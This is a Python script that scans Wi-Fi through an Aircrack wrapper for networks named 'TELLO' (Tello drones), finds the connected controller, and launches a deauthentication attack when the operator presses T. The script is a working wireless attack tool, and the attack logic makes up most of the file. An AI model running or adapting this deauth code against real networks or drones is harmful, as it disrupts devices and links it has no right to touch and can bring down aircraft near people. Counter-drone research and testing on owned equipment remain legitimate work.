import sys
import AircrackWrapper

def getEssid(scan_output):
	substring = "TELLO"
	lineIndexes = []
	listOfESSID = []
	list = scan_output.splitlines()
	for i in range (0, len(list)-1):
		if substring in list[i]:
			lineIndexes.append(i)
	if len(lineIndexes) < 1:
		print("No UAS found on network adapter interface")
		listOfESSID = False
	else:
		for i in range (0, len(lineIndexes)):
			details = list[lineIndexes[i]].split()
			listOfESSID.append(details[8])
			for item in details:
				print(item)
	return listOfESSID

def getBssid(scan_output):
	substring = "TELLO"
	lineIndexes = []
	listOfBSSID = []
	list = scan_output.splitlines()
	for i in range (0, len(list)-1):
		if substring in list[i]:
			lineIndexes.append(i)
	if len(lineIndexes) < 1:
		print("No UAS found on network adapter interface")
		listOfBSSID = False
	else:
		for i in range (0, len(lineIndexes)):
			details = list[lineIndexes[i]].split()
			listOfBSSID.append(details[0])
			listOfBSSID.append(details[5])
			listOfBSSID.append(details[8])
			for item in details:
				print(item)
	return listOfBSSID

def getTargetBSSID(scan_output):
	list = scan_output.splitlines()
	if len(list) >3:
		details = list[3].split()
		return details[1]
	else:
		return False

if __name__ == "__main__":
	NAI = str(input("Enter the network adapter interface: "))
	mode = str(input("Enter the mode (LIVE/DETECT): "))

	if mode =="detect":
		aircrack = AircrackWrapper.Aircrack(NAI, simulation=True)
		ap_scan_output = aircrack.detect_ap(timeout=30)
		listOfDroneDetails = getEssid(ap_scan_output)
		if listOfDroneDetails == False:
			print("------------------------------------------------")
		else:
			print("Devices found: ")
			for i in range (0, len(listOfDroneDetails)):
				if i % 2 == 0:
					print(listOfDroneDetails[i])
	else:
		aircrack = AircrackWrapper.Aircrack(NAI, simulation=False)
		ap_scan_output = aircrack.detect_ap(timeout=30)
		print(ap_scan_output)
		listOfDroneDetails = getBssid(ap_scan_output)
		if listOfDroneDetails == False:
			print("----------")
		else:
			for i in range (0, len(listOfDroneDetails)):
				if i % 3 == 0:
					bssid = listOfDroneDetails[i]
				else:
					if "TELLO" in listOfDroneDetails[i]:
						continue
					else:
						channel = listOfDroneDetails[i]
						op_scan_output = aircrack.detect_op(bssid, channel, timeout=20)
						print(op_scan_output)
						target = getTargetBSSID(op_scan_output)
						if target == False:
							print("Drone not being stationed")
						else:
							print(listOfDroneDetails[i+1])
							user = str(input("Press T to target or I to ignore: "))
							if user == "T":
								print("Deauth attack starting")
								aircrack.deauth(bssid, target, timeout=30)
							else:
								print("Target ignored")
else:
	print("Startup error")

